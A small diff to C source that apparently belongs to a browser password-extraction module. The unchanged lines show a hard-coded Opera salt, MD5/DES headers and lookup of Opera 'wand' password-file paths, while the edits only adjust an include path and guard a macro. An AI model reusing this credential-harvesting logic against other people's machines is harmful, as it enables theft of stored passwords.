@@ -7,7 +7,7 @@
 
 #include <crypto/md5.h>
 #include <crypto/des.h>
-#include "../common.h"
+#include "../../H4DLL/common.h"
 
 const unsigned char opera_salt[11] = { 0x83, 0x7D, 0xFC, 0x0F, 0x8E, 0xB3, 0xE8, 0x69, 0x73, 0xAF, 0xFF };
 
@@ -50,8 +50,9 @@ static inline WCHAR* GetOPProfilePath11(WCHAR* FullPath, size_t size, const WCHA
 	return GetOPProfilePath(FullPath, size, L"Opera\\Opera", lpWandFile);
 }
 
-
-#define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
+#ifndef SAFE_FREE
+	#define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
+#endif
 
 #define FORM_FIELDS 0x0c020000
 
